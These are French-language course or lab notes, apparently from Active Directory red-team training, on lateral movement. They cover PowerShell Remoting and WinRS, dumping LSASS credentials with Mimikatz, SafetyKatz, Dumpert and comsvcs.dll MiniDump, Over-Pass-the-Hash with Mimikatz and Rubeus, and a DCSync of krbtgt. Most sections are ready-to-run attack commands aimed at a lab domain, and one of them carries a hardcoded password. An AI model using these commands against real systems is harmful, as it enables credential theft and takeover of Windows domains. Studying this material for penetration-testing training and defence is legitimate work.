---
title: "3 - Lateral Movement"
---

# Lateral Movement

## PowerShell Remoting
PowerShell Remoting utilise Windows Remote Management (WinRM), l'implémentation Microsoft du protocole WS-Management.
Activé par défaut sur Windows Server depuis la version 2012.
Ports WinRM par défaut : 5985 (HTTP) et 5986 (HTTPS).
Il permet notamment d'administrer les serveurs Windows Server Core.
Sur un poste Windows, l'activation de PowerShell Remoting peut nécessiter des droits administrateur.
Les privilèges de la session dépendent du compte et de la configuration du point de terminaison.

### One-to-One

Une PSSession permet d'interagir avec une machine distante en conservant l'état de la session.

- Session interactive.
- Nouveau processus `wsmprovhost`.
- Conservation de l'état entre les commandes.

Cmdlets PowerShell :
```powershell
– New-PSSession
– Enter-PSSession
```

```powershell
# 1. PS> 
Enter-PSSession <machine>
Get-PSHostProcessInfo #this will show the ProccessID of wsmprovhost

# 2. PS> 
$machine = New-PSSession <machine>
```

### One-to-Many

Également appelé Fan-out Remoting.
- Exécution non interactive.
- Exécution parallèle.

Cmdlet PowerShell :
```powershell
– Invoke-Command
```

Modes d'exécution :

- Plusieurs ordinateurs distants.
- Sessions déconnectées (PowerShell 3 et versions ultérieures).
- Tâches en arrière-plan.

Le paramètre `-Credential` permet de spécifier les identifiants utilisés.

#### Exécution d'un ScriptBlock
Exécuter un bloc PowerShell sur les machines indiquées.
```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName	(Get-Content <list_of_servers>)
```

#### Exécution d'un fichier
Exemple d'utilisation du paramètre `-FilePath`.
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -	ComputerName (Get-Content <list_of_servers>)
```

#### Fonction locale
Exemple d'utilisation d'une fonction PowerShell.
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

#### Arguments
Le paramètre `-ArgumentList` transmet des arguments positionnels.
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

#### Appel de fonction dans un script
Exemple d'appel à partir d'un fichier PowerShell.
```powershell
Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

#### Session persistante
Conserver les variables entre plusieurs appels à `Invoke-Command`.
```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

### WinRS

PowerShell Remoting prend en charge la transcription et la journalisation des ScriptBlocks.

WinRS constitue une autre interface d'administration distante utilisant WinRM.
```powershell
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

Autres interfaces mentionnées : `winrm.vbs`.
Objets COM WSMan.

[WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)

## Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz)

[Documentation DCSync](https://adsecurity.org/?p=2207)

Les opérations présentées sur LSASS nécessitent des privilèges adaptés.

Invoke-Mimikatz est une version PowerShell de Mimikatz.

### Invoke-Mimikatz
Exemple relatif aux données d'authentification locales.
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

### SafetyKatz
Outil associé à l'analyse de la mémoire de LSASS.
```powershell
SafetyKatz.exe "sekurlsa::ekeys"
```

### SharpKatz
Implémentation C# de certaines fonctionnalités de Mimikatz.
```powershell
SharpKatz.exe --Command ekeys
```

### Dumpert
Outil relatif à la mémoire de processus.
```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```

### pypykatz
Implémentation Python de fonctionnalités de Mimikatz.
```powershell
pypykatz.exe live lsa
```

### comsvcs.dll
Exemple de création d'un fichier de vidage mémoire.
```powershell
tasklist /FI "IMAGENAME eq lsass.exe" 
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

Autres outils mentionnés sous Linux : Impacket.
Physmem2profit.

### Outils et documentation

[Types de connexion Windows et identifiants](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them)

[Invoke-Mimikatz.ps1 in Nishang](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)

[SharpKatz on GitHub](https://github.com/b4rtik/SharpKatz)

[Dumpert on GitHub](https://github.com/outflanknl/Dumpert)

[BetterSafetyKatz on GitHub](https://github.com/Flangvik/BetterSafetyKatz)

[SafetyKatz on GitHub](https://github.com/GhostPack/SafetyKatz)

[pypykatz on GitHub](https://github.com/skelsec/pypykatz)

[lsassy on GitHub](https://github.com/Hackndo/lsassy)

[impacket on GitHub](https://github.com/SecureAuthCorp/impacket/)

[physmem2profit on GitHub](https://github.com/FSecureLABS/physmem2profit)

## Authentification

### Over-Pass-the-Hash

Over-Pass-the-Hash (OPTH) concerne l'utilisation de clés d'authentification pour obtenir des tickets Kerberos.

Les exemples suivants sont associés à une session élevée.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"' 
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```

Le type de connexion 9 correspond à NewCredentials, également utilisé par `runas /netonly`.

#### Rubeus
Exemple sans élévation mentionné dans les notes.
```powershell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

#### Session élevée
Autre exemple mentionné dans les notes.
```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Pass-the-Hash** : authentification reposant sur un hash NTLM.
**Over-Pass-the-Hash** : authentification Kerberos reposant sur du matériel cryptographique.

 
## DCSync

DCSync repose sur les droits de réplication Active Directory. Ces droits ne sont pas exclusivement réservés aux Domain Admins.

Le mécanisme de réplication peut exposer des données d'authentification du domaine sans exécution de code sur le contrôleur de domaine.

Exemples du laboratoire concernant le compte krbtgt :
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
